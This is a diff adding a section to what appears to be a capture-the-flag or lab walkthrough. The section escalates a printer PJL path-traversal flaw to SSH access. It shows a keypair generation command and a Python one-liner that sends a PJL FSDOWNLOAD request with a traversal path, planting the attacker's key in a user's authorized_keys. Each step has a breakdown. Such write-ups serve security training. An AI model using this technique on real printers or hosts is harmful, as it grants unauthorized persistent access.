@@ -708,6 +708,80 @@ s.close()
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.4 Escalate PJL Traversal to Interactive Access (Write SSH Key)
+
+#### 4.4.1 Generate SSH Keypair (attacker, local)
+
+**Command:** `ssh-keygen -t rsa -f archivist_key -N ""`
+
+**Breakdown:**
+
+- `ssh-keygen`
+    - **Description:** Generates an SSH authentication keypair.
+    - **Purpose:** Produce a dedicated key to plant on the target, giving us a login credential for `archivist`.
+- `-t rsa`
+    - **Description:** Key type — RSA.
+    - **Purpose:** Broadly compatible key type accepted by the target's OpenSSH.
+- `-f archivist_key`
+    - **Description:** Output filename for the private key (public key gets `.pub` appended).
+    - **Purpose:** Keep this engagement key separate from any personal keys.
+- `-N ""`
+    - **Description:** Sets an empty passphrase.
+    - **Purpose:** Allow non-interactive login (no passphrase prompt) when SSHing in as `archivist`.
+
+**Result:**
+
+shell
+
+```shell
+Generating public/private rsa key pair.
+Your identification has been saved in archivist_key
+Your public key has been saved in archivist_key.pub
+The key fingerprint is:
+SHA256:InA9/3UOPCgH2fdDoY7BqS70S1zG8Rm5eNF/zLHH2cA kali@kali
+```
+
+Keypair created: `archivist_key` (private) and `archivist_key.pub` (public). The public key is what we write to the target.
+
+###### 4.4.2 Write the Public Key via PJL FSDOWNLOAD (in the `lp` shell)
+
+**Command:**
+
+python
+
+```python
+python3 -c "
+import socket
+key = b'ssh-rsa AAAAB3NzaC1yc2E...wjaomtdukTbpXgEakgQuRaNwGTYksXWczRhf0= kali@kali\n'
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('127.0.0.1', 9100))
+header = b'@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"../../../../home/archivist/.ssh/authorized_keys\" SIZE=%d\n' % len(key)
+s.send(header)
+s.send(key)
+s.close()
+print('[+] Key written')
+"
+```
+
+**Breakdown:**
+
+- `@PJL FSDOWNLOAD FORMAT:BINARY NAME="..." SIZE=<n>`
+    - **Description:** PJL command that writes ("downloads") a file _into_ the printer's storage; `FORMAT:BINARY` sends raw bytes, `SIZE` declares the byte count that follows.
+    - **Purpose:** Turn the traversal primitive from read to write, planting an attacker-controlled file on the host.
+- `../../../../home/archivist/.ssh/authorized_keys`
+    - **Description:** Traversal path escaping the printer root, targeting `archivist`'s SSH `authorized_keys`.
+    - **Purpose:** Install our public key as a trusted login credential for `archivist`, converting file-write into interactive access.
+
+**Result:**
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
